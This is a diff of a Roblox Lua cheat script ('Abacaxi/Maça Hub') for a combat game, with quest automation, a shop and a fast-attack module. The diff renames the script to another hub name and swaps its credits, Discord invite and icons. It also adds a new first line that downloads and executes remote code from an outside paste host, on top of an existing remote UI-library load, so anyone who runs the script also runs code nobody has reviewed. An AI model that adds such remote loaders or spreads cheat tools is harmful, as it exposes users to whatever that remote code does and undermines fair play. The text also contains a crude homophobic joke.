@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/e9c206fd76482ee2"))()
 --[[
     Abacaxi Hub - Optimized Version
     Performance & Code Quality Improvements
@@ -97,13 +98,13 @@ local function NotificacaoNightMystic(titulo, mensagem)
     end
 end
 
-NotificacaoNightMystic("Maça Hub", "Script carregado com sucesso!")
+NotificacaoNightMystic("𝙏𝙖̀𝙮 𝙃𝙪𝙗", "Script carregado com sucesso!")
 
 -- ========================================
 -- SAVE SYSTEM (Optimized)
 -- ========================================
 local HttpService = Services.HttpService
-local FolderName = "Maça Hub"
+local FolderName = "𝙏𝙖̀𝙮 𝙃𝙪𝙗"
 local FileName = "Settings.json"
 local FullPath = FolderName .. "/" .. FileName
 
@@ -2396,8 +2397,8 @@ QuestNeta = function()
 		};
 	end;
 	local Library = loadstring(game:HttpGet("https://pastefy.app/2NsMZRkm/raw"))():MakeWindow({
-    Title = "Maça Hub",
-    SubTitle = "by two and seven and yezzy",
+    Title = "𝙏𝙖̀𝙮 𝙃𝙪𝙗",
+    SubTitle = "by Tùng dz",
     SaveFolder = "Maça.json"
 })
 -- Criar ScreenGui
@@ -2409,7 +2410,7 @@ screenGui.Parent = game.CoreGui
 local imageButton = Instance.new("ImageButton")
 imageButton.Size = UDim2.new(0, 50, 0, 50)
 imageButton.Position = UDim2.new(0.15, 0, 0.15, 0)
-imageButton.Image = "rbxassetid://73902065845651"
+imageButton.Image = "rbxassetid://91222518412026"
 imageButton.BackgroundTransparency = 1
 imageButton.Parent = screenGui
 
@@ -2555,16 +2556,16 @@ local Setting = Library:MakeTab({
     Icon = "rbxassetid://7734053495"
 })
 Discord:AddDiscordInvite({
-    Name = "Maça Hub",
-    Description = "Join for support and updates",
-    Logo = "rbxassetid://73902065845651",
-    Invite = "https://discord.gg/F2NXMVZ3VE"
+    Name = "𝙑𝙏𝘿 𝙍𝙊𝘽𝙇𝙊𝙓 ",
+    Description = "vào sever ngay không = 𝙂𝙖𝙮",
+    Logo = "rbxassetid://104581093792126",
+    Invite = "https://discord.gg/bdaczqK55h"
 })
 local credits = Discord:AddParagraph({
     Title = "Credits For Someone Peoples",
     Desc = ""
 })
-credits:SetDesc("nigth mystic, astral, tboy kiddo etc")
+credits:SetDesc("nigth mystic, astral, tboy kiddo etc,𝙑𝙏𝘿 𝙍𝙊𝘽𝙇𝙊𝙓 ")
 
 Shop:AddSection("Fighting Shop")
 Shop:AddButton({
@@ -12111,6 +12112,6 @@ end)
 _ENV.rz_FastAttack = FastAttack
 FastAttackModule.FastAttack = FastAttack
 
-NotificacaoNightMystic("Maça Hub", "✅ Todos os sistemas carregados!")
+NotificacaoNightMystic("𝙏𝙖̀𝙮 𝙝𝙪𝙗", "✅ MENU ĐÃ CHẠY XONG BẠN SẼ ĐƯỢC HỘP KHÔ GÀ")
 
 return FastAttackModulem
